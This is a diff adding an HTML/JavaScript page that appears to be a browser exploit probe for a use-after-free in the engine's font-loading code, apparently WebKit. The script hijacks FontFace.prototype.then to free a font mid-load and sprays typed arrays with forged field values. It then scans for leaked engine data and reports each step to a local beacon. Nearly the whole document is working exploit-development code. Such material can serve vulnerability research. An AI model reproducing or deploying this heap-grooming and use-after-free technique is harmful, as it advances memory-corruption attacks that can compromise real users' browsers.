@@ -1,0 +1,69 @@
+<!doctype html><meta charset="utf-8"><title>uaf59 forge single field</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+/* One forged field per load, driven by localStorage so each arm gets a fresh
+   WebProcess-accurate run but the same warm guide.
+   ARM = [ offset, value32, offset to scan for the engine's own write ] */
+var ARMS=[
+  [0x68,0,0x58],   /* baseline: 0x68 = 0            */
+  [0x68,1,0x58],   /* 0x68 = 1 (the keyCount claim) */
+  [0x58,0,0x68],   /* baseline: 0x58 = 0            */
+  [0x58,1,0x68],   /* 0x58 = 1                      */
+  [0x68,0x41,0x58],/* 0x68 = a small nonzero        */
+  [0x58,0x41,0x68] /* 0x58 = a small nonzero        */
+];
+var idx=0;
+try { idx = parseInt(localStorage.getItem('occ59c')||'0',10)||0; } catch(e){ idx=0; }
+if (idx>=ARMS.length) idx=0;
+try { localStorage.setItem('occ59c', String(idx+1)); } catch(e){}
+var OFF=ARMS[idx][0], VAL=ARMS[idx][1], SCAN=ARMS[idx][2];
+var SIZES=[192,224,256,320,384,512,768,1024,2048], K=8, styleEl=null, firedHere=false, MAP=[], U=Date.now().toString(36);
+function run(){
+  var fam='s'+U, nm='f'+U;
+  b('U59-ARM-'+idx+'-OFF-'+OFF+'-VAL-'+VAL);
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  var A=new FontFace(nm,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded; window.__alive=[A];
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) { styleEl.remove(); styleEl.textContent=''; }
+      try { document.fonts.delete(this); } catch(e) {}
+      styleEl=null;
+      document.body.offsetHeight;
+      MAP=[];
+      for (var si=0;si<SIZES.length;si++){
+        for (var k=0;k<K;k++){
+          var u=new Uint8Array(SIZES[si]);
+          u[OFF]=VAL; u[OFF+1]=0; u[OFF+2]=0; u[OFF+3]=0;
+          MAP.push(u);
+        }
+      }
+      try { document.fonts.check('1em '+fam); } catch(e){}
+      b('U59-CHECK-RETURNED');
+      return undefined;
+    }, set:function(){}
+  });
+  document.fonts.load('1em '+nm+', '+fam, 'AB').then(function(){ b('U59-RESOLVED'); },
+                                                    function(){ b('U59-REJECTED'); });
+  function scanAt(){
+    var hits=[];
+    for (var i=0;i<MAP.length;i++){ var u=MAP[i];
+      if (u[SCAN]||u[SCAN+1]||u[SCAN+2]||u[SCAN+3]||u[SCAN+4]||u[SCAN+5]||u[SCAN+6]||u[SCAN+7])
+        hits.push('b'+i+':'+hex8(u,SCAN));
+    }
+    b('U59-SCAN-N-'+hits.length);
+    b('U59-HITS-'+hits.join('|')+'-of-'+MAP.length);
+  }
+  setTimeout(scanAt,90);
+  setTimeout(scanAt,300);
+  setTimeout(function(){ b('U59-ALIVE-700'); },700);
+}
+function go(){ b('U59-PARSE'); run(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(go,0);
+else document.addEventListener('DOMContentLoaded',go);
+</script></body>
